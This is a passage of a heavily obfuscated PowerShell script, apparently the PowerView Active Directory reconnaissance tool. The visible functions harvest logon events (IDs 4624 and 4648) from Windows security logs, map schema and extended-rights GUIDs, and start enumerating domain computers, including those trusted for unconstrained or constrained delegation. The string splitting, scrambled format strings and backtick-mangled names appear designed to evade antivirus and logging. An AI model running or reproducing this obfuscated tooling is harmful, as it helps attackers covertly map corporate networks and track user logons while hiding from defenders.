'+' '+' '+' '+' '+' '+' '+' '+' '+'<Select'+' '+('Path={0}Se'+'cu'+'r'+'ity'+'{'+'0}>
 ')  -f  [char]34+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'*'+'[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'Sys'+'te'+'m[
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'Prov'+'ide'+'r[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+(('@Na'+'me=zTZMic'+'roso'+'f'+'t-Windows'+'-S'+'ec'+'uri'+'ty-'+'AuditingzTZ
 ')  -CrePlace  'zTZ',[CHAr]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'an'+'d '+'(Lev'+'el'+'=4 '+'o'+'r '+'L'+'evel'+'=0) '+'a'+'nd '+'(E'+'ventID'+'='+'4'+'648)
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'a'+'nd '+'TimeCre'+'at'+'ed['+'
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('@Sys'+'temTime&gt'+';=Lj19wL(9w'+'LSta'+'rtTi'+'m'+'e'+'.ToUnive'+'rsalTime('+').ToString'+'('+'Lj'+'1sLj1))'+'Lj1 ')."r`epl`ACe"('Lj1',[sTrING][ChAr]39)."Re`pL`Ace"(([ChAr]57+[ChAr]119+[ChAr]76),[sTrING][ChAr]36)+'a'+'nd '+(('@S'+'ystemTime&l'+'t'+';=YG'+'x1mh('+'1m'+'hE'+'ndTime.T'+'oUniv'+'ersalTim'+'e().ToString('+'Y'+'GxsY'+'Gx'+'))YGx'+'
 ') -ReplAcE  'YGx',[ChaR]39  -ReplAcE([ChaR]49+[ChaR]109+[ChaR]104),[ChaR]36)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+'</Sele'+'ct'+'>

 '+' '+' '+' '+' '+' '+' '+' '+'<Supp'+'r'+'ess '+(('Pat'+'h=YD3'+'Se'+'curityYD'+'3'+'>
 ') -REplace  'YD3',[CHAR]34)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'*'+'[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'Sy'+'stem[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'P'+'rovid'+'er['+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+(('@N'+'am'+'e=c5VMic'+'ros'+'oft-Wind'+'o'+'ws-Securit'+'y-A'+'uditingc5V
 ') -RePlACe  'c5V',[CHaR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'and'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'(Level='+'4 '+'o'+'r '+'Leve'+'l=0) '+'an'+'d '+'(Ev'+'e'+'ntID'+'=4624'+' '+'or'+' '+'Eve'+'ntID=4'+'625 '+'or'+' '+'E'+'ventI'+'D=4634)
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'and'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'*['+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'E'+'ve'+'ntData['+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'('+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+(('(Data[@Name='+'Cv'+'cLogo'+'nTyp'+'eCv'+'c]=Cvc5Cvc ') -REPlAcE  'Cvc',[CHaR]39)+'or'+' '+('Data[@Name=mTw'+'L'+'o'+'gonTypemTw]'+'=mT'+'w0mTw)
 ')."r`Epl`AcE"('mTw',[STRING][chAr]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'or'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('Data'+'[@Name={0'+'}Targ'+'etU'+'serName{0}]={0}ANONY'+'M'+'OU'+'S ') -f [chAR]39+('LO'+'GON{0}
 ') -F  [ChaR]39+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'or
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('Data[@Nam'+'e=PV3'+'T'+'argetUse'+'rSI'+'D'+'P'+'V3'+']=PV3S-1-'+'5-18PV'+'3
 ')."rE`pLACE"('PV3',[StRINg][cHAR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+')
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+'</S'+'uppre'+'ss>'+'
'+' '+' '+' '+' '+('</'+'Query>
'+'<'+'/Qu'+'ery'+'List>
'+'{'+'0}')-F[ChaR]34)
        ${ev`eNtArGUM`en`TS} = @{
            ("{1}{0}{2}"-f'ilterXPa','F','th') = ${xPA`THf`i`lteR}
            ("{2}{0}{1}"-f 'gNam','e','Lo') = ("{2}{1}{0}"-f'y','rit','Secu')
            ("{0}{2}{1}{3}" -f 'M','ve','axE','nts') = ${Ma`XEV`ents}
        }
        if (${p`Sbo`UnDPa`RAmeT`e`RS}[("{2}{0}{1}{3}" -f 're','d','C','ential')]) { ${EVE`NTarGum`e`NTS}[("{2}{1}{0}"-f'ntial','de','Cre')] = ${Cr`ED`ENT`iAL} }
    }

    PROCESS {
        ForEach (${cO`MpUT`ER} in ${COm`Pu`TErNA`me}) {

            ${e`VE`NTA`RGUmENtS}[("{0}{1}{2}" -f 'Compu','te','rName')] = ${CO`M`p`UtER}

            &("{1}{0}{3}{2}" -f 'et-WinEve','G','t','n') @EventArguments| &("{3}{0}{1}{2}"-f 'a','ch-Objec','t','ForE') {
                ${eV`ent} = ${_}
                ${PRope`R`TI`es} = ${eV`ENt}."P`ROperT`IeS"
                Switch (${EVe`NT}."I`d") {
                    
                    4624 {
                        
                        if(-not ${prOPERT`i`Es}[5]."VaL`UE".("{1}{2}{0}"-f 'h','End','sWit').Invoke('$')) {
                            ${OuTP`UT} = &("{1}{2}{0}"-f 'ect','New-Ob','j') ("{1}{0}" -f'ct','PSObje') -Property @{
                                ("{1}{0}{3}{2}"-f'ompute','C','Name','r')              = ${c`o`mPUTER}
                                ("{2}{3}{0}{1}" -f 'meCrea','ted','T','i')               = ${eVe`NT}."tiM`Ec`REAtEd"
                                ("{0}{1}" -f'Ev','entId')                   = ${E`Ve`Nt}."I`D"
                                ("{1}{0}{2}"-f 'ectU','Subj','serSid')            = ${prO`PE`Rt`iEs}[0]."vA`luE".("{1}{2}{0}"-f 'g','T','oStrin').Invoke()
                                ("{0}{1}{4}{2}{3}" -f 'Su','bje','UserNa','me','ct')           = ${pR`ope`RtIes}[1]."v`ALuE"
                                ("{4}{2}{1}{3}{0}" -f 'me','mai','bjectDo','nNa','Su')         = ${pR`oPeRt`Ies}[2]."v`ALuE"
                                ("{1}{3}{0}{2}"-f 'n','SubjectLog','Id','o')            = ${pROp`eRt`ieS}[3]."vaL`Ue"
                                ("{1}{0}{2}"-f'rS','TargetUse','id')             = ${P`ROpE`RTI`eS}[4]."vaL`Ue".("{1}{0}"-f'g','ToStrin').Invoke()
                                ("{0}{3}{1}{2}" -f'TargetU','rNam','e','se')            = ${prope`RT`i`eS}[5]."v`ALuE"
                                ("{1}{2}{4}{0}{3}" -f'a','Target','D','inName','om')          = ${pr`O`PErTI`Es}[6]."val`UE"
                                ("{1}{2}{0}{3}" -f'getLogo','Ta','r','nId')             = ${PR`oPerTI`Es}[7]."Va`lUe"
                                ("{1}{0}{3}{2}"-f 'ogo','L','pe','nTy')                 = ${PROPE`RT`iES}[8]."V`ALUE"
                                ("{2}{1}{3}{0}{4}"-f 'am','n','Logo','ProcessN','e')          = ${pro`p`ertIeS}[9]."vaL`UE"
                                ("{1}{4}{0}{2}{6}{3}{5}" -f'on','Authenticat','Pa','m','i','e','ckageNa') = ${PR`OP`erTIEs}[10]."vAl`Ue"
                                ("{1}{2}{0}"-f'e','Wo','rkstationNam')           = ${prO`pERt`ies}[11]."v`AlUE"
                                ("{0}{1}" -f'Log','onGuid')                 = ${PRope`RTi`Es}[12]."va`lUe"
                                ("{0}{4}{2}{1}{3}"-f 'Transmitt','Servic','d','es','e')       = ${p`ROpERti`ES}[13]."vaL`Ue"
                                ("{2}{3}{4}{0}{1}"-f'eNa','me','LmP','ack','ag')             = ${p`Rop`ert`Ies}[14]."VAL`UE"
                                ("{2}{1}{0}"-f 'ngth','eyLe','K')                 = ${pROP`E`Rt`iEs}[15]."v`ALUE"
                                ("{0}{1}" -f'Process','Id')                 = ${prOPeR`TI`ES}[16]."VAL`Ue"
                                ("{2}{1}{0}"-f'Name','ocess','Pr')               = ${pR`OpeRT`Ies}[17]."val`Ue"
                                ("{1}{2}{0}" -f 's','I','pAddres')                 = ${p`RoPERT`Ies}[18]."vAl`UE"
                                ("{0}{1}" -f 'I','pPort')                    = ${Pro`per`T`iES}[19]."V`Alue"
                                ("{2}{1}{3}{0}"-f'l','sona','Imper','tionLeve')        = ${PR`OpE`Rt`iEs}[20]."va`lUe"
                                ("{0}{3}{2}{1}{4}{5}"-f 'Restric','m','dAd','te','inMod','e')       = ${Pr`op`eRTiES}[21]."VaL`UE"
                                ("{5}{4}{2}{3}{1}{0}" -f 'ame','ndUserN','b','ou','getOut','Tar')    = ${PRoP`e`Rt`IeS}[22]."Va`lue"
                                ("{0}{3}{4}{1}{2}" -f'TargetO','m','e','utboundDoma','inNa')  = ${P`ROPeRtI`Es}[23]."v`Alue"
                                ("{1}{3}{4}{2}{0}"-f't','Virtu','un','al','Acco')            = ${P`ROpeR`TieS}[24]."v`Alue"
                                ("{4}{2}{1}{3}{5}{0}" -f 'dLogonId','tLi','e','n','Targ','ke')       = ${ProPeRT`I`ES}[25]."v`AlUE"
                                ("{1}{2}{0}"-f 'n','E','levatedToke')             = ${pro`p`eR`TIeS}[26]."val`UE"
                            }
                            ${Ou`Tp`Ut}."p`s`OBJECt"."tY`pE`NA`mes".("{1}{0}" -f'sert','In').Invoke(0, ("{3}{0}{1}{6}{2}{5}{4}"-f'o','werVie','.Logon','P','t','Even','w'))
                            ${o`UtP`Ut}
                        }
                    }

                    
                    4648 {
                        
                        if((-not ${pr`Op`e`RTIEs}[5]."V`Alue".("{0}{1}" -f 'EndsWit','h').Invoke('$')) -and (${pRo`P`E`RTieS}[11]."vAL`Ue" -match ((("{1}{4}{3}{2}{0}" -f 'e','taskhost','x','e','9IY.'))-CREplACe  ([CHar]57+[CHar]73+[CHar]89),[CHar]92))) {
                            ${OUtP`Ut} = &("{0}{1}{2}"-f'N','ew-','Object') ("{2}{1}{0}"-f'bject','SO','P') -Property @{
                                ("{1}{0}{2}"-f 'om','C','puterName')              = ${Co`Mpu`TeR}
                                ("{1}{0}{2}" -f 'r','TimeC','eated')       = ${E`V`eNT}."T`IMec`ReaTEd"
                                ("{1}{2}{0}" -f 'd','Ev','entI')           = ${eve`NT}."id"
                                ("{0}{3}{2}{1}{4}"-f 'Subjec','er','Us','t','Sid')    = ${prO`P`erT`IES}[0]."vaL`UE".("{2}{0}{1}" -f 'tri','ng','ToS').Invoke()
                                ("{3}{2}{0}{1}{4}"-f 'r','N','bjectUse','Su','ame')   = ${P`Ro`pErtIes}[1]."V`ALUE"
                                ("{2}{1}{0}{3}{4}"-f 'DomainNa','ject','Sub','m','e') = ${pr`oP`ER`TIes}[2]."Val`Ue"
                                ("{2}{1}{0}" -f'ogonId','bjectL','Su')    = ${pRO`PE`RTiEs}[3]."VaL`Ue"
                                ("{3}{1}{2}{0}"-f 'd','go','nGui','Lo')         = ${pr`o`PertiEs}[4]."vA`luE".("{2}{0}{1}"-f't','ring','ToS').Invoke()
                                ("{0}{1}{4}{3}{2}" -f'Targ','etUs','e','Nam','er')    = ${Pr`O`pER`TIes}[5]."v`ALue"
                                ("{0}{2}{3}{1}"-f 'Ta','ame','rgetDomai','nN')  = ${PRoP`ErTi`ES}[6]."vAl`Ue"
                                ("{0}{4}{1}{2}{3}" -f 'TargetLo','o','nGu','id','g')   = ${p`RO`PerTies}[7]."v`Alue"
                                ("{0}{2}{1}" -f'TargetServ','e','erNam')  = ${propE`R`TieS}[8]."vAL`Ue"
                                ("{1}{0}{2}"-f 'Inf','Target','o')        = ${p`RoPErT`I`ES}[9]."v`ALUe"
                                ("{0}{3}{1}{2}" -f'Pro','ss','Id','ce')         = ${PrOp`eRT`ies}[10]."vaL`Ue"
                                ("{1}{0}{2}"-f'essN','Proc','ame')       = ${Pr`O`pE`RTies}[11]."v`ALUE"
                                ("{1}{2}{0}" -f 'ddress','Ip','A')         = ${Pr`o`pERTIes}[12]."v`AlUE"
                                ("{0}{2}{1}" -f 'IpPo','t','r')            = ${PR`Op`ertIes}[13]."V`AluE"
                            }
                            ${OUt`pUt}."PsO`B`JEcT"."tYP`eNA`MEs".("{1}{2}{0}"-f 't','Ins','er').Invoke(0, ("{10}{9}{8}{2}{6}{1}{0}{4}{7}{5}{3}" -f're','itC','ew.','t','de','onEven','Explic','ntialLog','i','V','Power'))
                            ${oUT`put}
                        }
                    }
                    default {
                        &("{3}{2}{1}{0}"-f'g','nin','ite-War','Wr') "No handler exists for event ID: $($Event.Id) "
                    }
                }
            }
        }
    }
}


function g`et-DoMai`NgUi`Dm`Ap {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{4}{0}{2}{1}" -f 'ldPr','ss','oce','PSSh','ou'}, '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        ${d`oM`AIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{3}{0}{2}{1}" -f'ainC','er','ontroll','m','Do'})]
        [String]
        ${Ser`V`eR},

        [ValidateRange(1, 10000)]
        [Int]
        ${re`Sult`paG`esIzE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${se`RveR`T`IMELim`IT},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${creD`Ent`i`AL} =  ${q`FN}::"EM`Pty"
    )

    ${G`UIdS} = @{("{3}{1}{4}{7}{6}{9}{8}{5}{0}{2}" -f'000','000-','000000','00000','00','00-000','-00','00','0','00-0') = 'All'}

    ${f`O`R`eS`TArgUMEnTs} = @{}
    if (${pS`B`OUndPA`RameTeRS}[("{0}{1}{2}" -f 'Cred','ent','ial')]) { ${Fo`Rest`A`RGUmen`TS}[("{1}{0}{2}" -f'ntia','Crede','l')] = ${CrE`d`eNtIAl} }

    try {
        ${s`CH`EMapa`TH} = (&("{0}{2}{1}"-f'Get-','rest','Fo') @ForestArguments)."S`CHEma"."N`AME"
    }
    catch {
        throw ("{3}{8}{20}{10}{19}{17}{21}{16}{13}{11}{4}{18}{6}{0}{15}{7}{5}{9}{12}{14}{2}{1}" -f's',' Get-Forest','m','[Ge','ri','t',' fore','ema pa','t','h','Doma','t',' fr',' re','o','t sch','n','G','eving','in','-','UIDMap] Error i')
    }
    if (-not ${sc`hE`MApaTH}) {
        throw ("{4}{10}{8}{5}{6}{2}{9}{11}{0}{3}{13}{12}{1}{7}"-f'tr','th from Get-For','Er','ieving f','[','inGUI','DMap] ','est','oma','ro','Get-D','r in re','hema pa','orest sc')
    }

    ${seAR`cheR`A`RGU`meNTs} = @{
        ("{0}{1}{2}" -f 'Se','archB','ase') = ${S`ChemA`Pa`TH}
        ("{1}{0}{2}"-f'Fi','LDAP','lter') = ("{1}{2}{0}{4}{3}" -f 'GUI','(schemaI','D',')','D=*')
    }
    if (${P`S`BOu`NdParA`MEtErS}[("{0}{2}{1}"-f'Dom','n','ai')]) { ${SeArcH`e`RarG`UMEnts}[("{2}{1}{0}"-f'n','omai','D')] = ${dO`mA`IN} }
    if (${Psbou`N`Dp`Ar`AmE`TeRS}[("{0}{1}"-f 'Serv','er')]) { ${seAR`c`H`eRarG`UMEntS}[("{0}{1}" -f 'Serv','er')] = ${s`erVER} }
    if (${Ps`BOUND`pARa`mEt`ERS}[("{4}{2}{0}{1}{3}" -f'PageS','iz','t','e','Resul')]) { ${se`Ar`Ch`EraRGUMEnts}[("{1}{2}{3}{0}" -f 'eSize','Resul','tPa','g')] = ${ResU`l`Tp`AGEsiZE} }
    if (${Ps`BO`U`NdP`ARaMetERS}[("{3}{4}{1}{2}{0}"-f 'eLimit','rverT','im','S','e')]) { ${SE`A`RcHeRA`RgU`MENTs}[("{4}{3}{1}{0}{2}" -f 'meLi','i','mit','rT','Serve')] = ${S`erV`ERti`m`ElIMit} }
    if (${P`sBOUn`DpA`Ramet`eRs}[("{1}{2}{0}{3}"-f'entia','Cr','ed','l')]) { ${sEARC`HE`RaRG`Ume`N`TS}[("{1}{2}{0}" -f'ial','Crede','nt')] = ${C`REDENtI`Al} }
    ${s`C`hEM`ASEar`cheR} = &("{0}{3}{1}{2}"-f 'Get','nSear','cher','-Domai') @SearcherArguments

    if (${s`CH`emA`SEarCH`Er}) {
        try {
            ${rEsUl`TS} = ${SCHe`m`AS`earCH`Er}.("{0}{2}{1}" -f 'Find','ll','A').Invoke()
            ${r`esUlTs} | &("{0}{1}{3}{2}"-f 'Where','-Obj','ct','e') {${_}} | &("{0}{1}{2}{3}"-f 'For','Eac','h-Objec','t') {
                ${Gu`I`Ds}[(&("{1}{0}{2}{3}" -f'ew','N','-','Object') ("{0}{1}" -f'G','uid') (,${_}."PROPeR`Ti`ES"."Sc`hEmaI`dg`UId"[0]))."GU`ID"] = ${_}."pRop`E`RTIeS"."n`AmE"[0]
            }
            if (${Re`sul`Ts}) {
                try { ${r`e`SULTS}.("{0}{2}{1}"-f 'dis','ose','p').Invoke() }
                catch {
                    &("{2}{0}{1}"-f 'e-Verbos','e','Writ') ('[Get-Dom'+'ainG'+'U'+'ID'+'Map] '+'Er'+'ror '+'d'+'is'+'posi'+'ng '+'o'+'f '+'t'+'he '+'R'+'esults'+' '+'obj'+'ect'+': '+"$_")
                }
            }
            ${sCHe`ma`SeArC`hER}.("{1}{0}" -f 'se','dispo').Invoke()
        }
        catch {
            &("{2}{1}{0}" -f'ose','rb','Write-Ve') ('[G'+'et'+'-'+'DomainG'+'UI'+'DMap] '+'Erro'+'r '+'i'+'n '+'bui'+'ldi'+'ng '+'GU'+'ID '+'map:'+' '+"$_")
        }
    }

    ${se`ARcHERA`R`GU`men`Ts}[("{0}{1}{2}" -f 'Searc','hB','ase')] = ${S`ChEma`P`ATH}.("{0}{1}"-f'r','eplace').Invoke(("{1}{0}" -f 'ema','Sch'),("{0}{3}{2}{1}" -f 'E','Rights','ded-','xten'))
    ${s`e`ArcH`E`RarGUMEnTS}[("{2}{1}{0}"-f 'r','DAPFilte','L')] = ("{1}{3}{4}{7}{2}{5}{6}{0}{8}{9}" -f'cont','(o','C','bj','e','l','ass=','ct','rolAc','cessRight)')
    ${RI`ghT`S`seArCHeR} = &("{1}{4}{3}{2}{0}"-f 'earcher','Ge','ainS','om','t-D') @SearcherArguments

    if (${r`IG`hTs`seARCHER}) {
        try {
            ${r`eSul`Ts} = ${R`igHT`ssEaRCH`ER}.("{1}{0}"-f 'll','FindA').Invoke()
            ${re`s`Ults} | &("{2}{1}{3}{0}" -f 't','ere-','Wh','Objec') {${_}} | &("{1}{3}{0}{2}" -f'ec','ForEach-O','t','bj') {
                ${g`Ui`ds}[${_}."p`RoP`e`RTIes"."RiGhT`sG`UiD"[0].("{1}{0}{2}"-f'Stri','to','ng').Invoke()] = ${_}."Pro`PeR`TieS"."N`AME"[0]
            }
            if (${reSu`l`Ts}) {
                try { ${R`ESULts}.("{1}{0}" -f 'ispose','d').Invoke() }
                catch {
                    &("{1}{3}{0}{2}"-f'-Verb','W','ose','rite') ('[Ge'+'t-Do'+'m'+'ainGU'+'IDMap] '+'Error'+' '+'di'+'spo'+'sing '+'of'+' '+'the'+' '+'R'+'esu'+'lts '+'obj'+'ect: '+"$_")
                }
            }
            ${R`I`ghT`sseArc`Her}.("{0}{1}" -f'dispos','e').Invoke()
        }
        catch {
            &("{1}{2}{0}" -f 'erbose','Wr','ite-V') ('['+'Get-'+'Doma'+'inG'+'U'+'IDMap] '+'Error'+' '+'in'+' '+'b'+'uilding'+' '+'GUI'+'D '+'map:'+' '+"$_")
        }
    }

    ${gu`iDs}
}


function get-DomaI`Nc`omP`U`TEr {


    [OutputType({"{1}{0}{3}{2}"-f'erView.C','Pow','puter','om'})]
    [OutputType({"{3}{1}{6}{4}{2}{0}{5}"-f 'R','erView.','er.','Pow','mput','aw','Co'})]
    [CmdletBinding()]
    Param (
        [Parameter(pOSITIOn = 0, ValuEFrOMPIpELINE = ${T`RUe}, valUeFroMpiPElInebyproPeRTYNaMe = ${TR`Ue})]
        [Alias({"{0}{2}{3}{1}" -f 'SamAc','me','cou','ntNa'}, {"{0}{1}"-f 'N','ame'}, {"{2}{0}{1}" -f'o','stName','DNSH'})]
        [String[]]
        ${idE`Nt`itY},

        [Switch]
        ${UnConSTr`AI`Ned},

        [Switch]
        ${Tr`UStedT`o`AuTh},

        [Switch]
        ${PRiNt`Ers},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{3}{2}{4}{1}"-f 'Serv','Name','a','icePrincip','l'})]
        [String]
        ${S`Pn},

        [ValidateNotNullOrEmpty()]
        [String]
        ${OP`ErA`TINGs`ystEm},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Se`R`VICep`AcK},

        [ValidateNotNullOrEmpty()]
        [String]
        ${s`It`enamE},

        [Switch]
        ${Pi`NG},

        [ValidateNotNullOrEmpty()]
        [String]
        ${do`M`AiN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}"-f 'F','er','ilt'})]
        [String]
        ${ld`A`PFIlTeR},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PR`OP`ertI`ES},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f'ADS','Path'})]
        [String]
        ${SE`A`RChbasE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{3}{2}{0}{1}" -f'roll','er','Cont','ain','Dom'})]
        [String]
        ${S`ER`Ver},

        [ValidateSet({"{1}{0}" -f 'se','Ba'}, {"{1}{0}{2}"-f 'ne','O','Level'}, {"{1}{0}"-f'btree','Su'})]
        [String]
        ${sEaR`cH`sc`oPe} = ("{1}{0}{2}" -f 'btre','Su','e'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rEs`UlT`PAgE`SIzE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sE`RvErTimE`liMiT},

        [ValidateSet({"{1}{0}" -f'l','Dac'}, {"{0}{1}"-f'G','roup'}, {"{1}{0}"-f'one','N'}, {"{0}{1}" -f'Owne','r'}, {"{0}{1}"-f 'Sac','l'})]
        [String]
        ${seC`Uri`T`y`MASkS},

        [Switch]
        ${T`o`mbStOnE},

        [Alias({"{1}{2}{0}"-f'e','ReturnO','n'})]
        [Switch]
        ${F`InDO`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CreD`Enti`Al} =   (Get-iTem ("{0}{1}{2}{3}"-f'v','A','rIABle:','Qfn') )."VAl`UE"::"e`MPtY",

        [Switch]
        ${r`Aw}
    )

    DynamicParam {
        ${UacVaLue`Na`m`eS} =  ( gET-varIablE ('mN'+'s5'))."v`AlUe"::("{0}{1}" -f'GetNa','mes').Invoke(${UA`Cen`Um})
        
        ${uAc`Va`LUenam`ES} = ${uAc`Val`U`ena`MeS} | &("{0}{1}{3}{2}" -f'ForEac','h-','ct','Obje') {${_}; "NOT_$_"}
        
        &("{0}{1}{4}{2}{3}" -f'Ne','w-','Pa','rameter','Dynamic') -Name ("{1}{3}{2}{0}" -f 'er','UAC','t','Fil') -ValidateSet ${Ua`cvaL`Uen`Am`eS} -Type ([array])
    }

    BEGIN {
        ${SeArcHE`RAR`gUmE`NTS} = @{}
        if (${p`s`BouNdPAr`AmETeRs}[("{1}{2}{0}" -f'n','Do','mai')]) { ${SE`ArCHe`R`A`RG`UmEnts}[("{0}{1}" -f 'Dom','ain')] = ${DOMa`In} }
        if (${psbouN`dPAr`AmEt`erS}[("{3}{1}{0}{2}" -f 'ti','er','es','Prop')]) { ${s`eARcHER`A`R`GUMeNts}[("{0}{2}{1}"-f 'Pr','es','operti')] = ${Pro`P`ERTIEs} }
        if (${pSBO`U`Nd`PAraMET`erS}[("{1}{3}{2}{0}"-f 'e','Searc','s','hBa')]) { ${seAR`Ch`Era`RgU`Ments}[("{3}{1}{0}{2}"-f'Ba','earch','se','S')] = ${SE`A`R`ChBasE} }
        if (${PSbO`UNdpA`Ramet`ERS}[("{0}{1}"-f'Ser','ver')]) { ${sEaR`cHe`RARG`Uments}[("{0}{2}{1}" -f'S','rver','e')] = ${se`RV`ER} }
        if (${psb`o`UnDpAr`AmEtERS}[("{0}{2}{3}{1}" -f 'Sea','e','rchSc','op')]) { ${SEArc`HERaRGuM`E`NtS}[("{2}{1}{0}{3}" -f'op','c','SearchS','e')] = ${sEarCHS`c`OPe} }
        if (${pSb`ouNdPArAme`TE`RS}[("{0}{3}{2}{1}"-f'ResultPageS','e','z','i')]) { ${SE`ARChe`R`ArgUme`N`TS}[("{3}{2}{0}{1}" -f 'e','Size','g','ResultPa')] = ${r`EsU`Lt`pAGE`SiZe} }
        if (${P`sBO`UnDpARamEt`e`RS}[("{3}{2}{0}{1}"-f 'imeLi','mit','rT','Serve')]) { ${searCHE`RAr`GUM`En`Ts}[("{1}{2}{0}"-f'it','ServerTim','eLim')] = ${SER`V`er`TIM`elimIt} }
        if (${pSbO`UndPARAm`eTe`RS}[("{1}{2}{0}"-f'ks','SecurityMa','s')]) { ${SeaRCHE`RARgu`mE`NtS}[("{0}{2}{1}{3}"-f 'Sec','tyMa','uri','sks')] = ${seCur`i`Ty`Ma`sks} }
        if (${PS`BOundPaR`Am`eTERS}[("{1}{3}{2}{0}" -f'tone','To','bs','m')]) { ${SEa`RCh`erARG`U`ments}[("{1}{2}{0}{3}" -f 'ton','Tomb','s','e')] = ${ToM`B`STO`NE} }
        if (${PSbOU`NDpA`R`AMEtErS}[("{0}{2}{1}" -f'Cre','al','denti')]) { ${SEARc`HEr`A`RGUmENTS}[("{1}{0}{2}"-f'dentia','Cre','l')] = ${cREDE`N`TI`Al} }
        ${CO`MPSE`A`RChER} = &("{3}{0}{2}{1}"-f '-','nSearcher','Domai','Get') @SearcherArguments
    }

    PROCESS {
        
        if (${psBO`UNdpARaM`E`TE`Rs} -and (${PSBOuNDp`ArAmE`T`ERs}."CO`UNt" -ne 0)) {
            &("{3}{0}{4}{2}{1}"-f'y','eter','icParam','New-D','nam') -CreateVariables -BoundParameters ${p`SBOu`N`dpARaM`eT`ERS}
        }

        if (${COMPsEa`RcH`er}) {
            ${iDE`Ntit`yf`iL`Ter} = ''
            ${f`il`TeR} = ''
            ${iden`TITY} | &("{1}{0}{2}"-f'je','Where-Ob','ct') {${_}} | &("{4}{1}{0}{3}{2}" -f'-','Each','bject','O','For') {
                ${I`Den`TItyIN`sTancE} = ${_}.("{0}{1}{2}"-f'R','epl','ace').Invoke('(', '\28').("{0}{1}"-f'R','eplace').Invoke(')', '\29')
                if (${iDEN`T`I`Tyinst`AN`cE} -match ("{1}{0}" -f '1-','^S-')) {
                    ${iDEN`TItyf`I`lter} += "(objectsid=$IdentityInstance)"
                }
                elseif (${ID`EntItYi`NS`Tance} -match ("{0}{1}" -f '^CN','=')) {
                    ${iD`En`TITYf`IltEr} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${PSb`OunD`PA`RAMEteRs}[("{1}{0}" -f 'main','Do')]) -and (-not ${PsBO`Und`PARAm`ete`Rs}[("{0}{2}{3}{1}"-f'Se','chBase','a','r')])) {
                        
                        
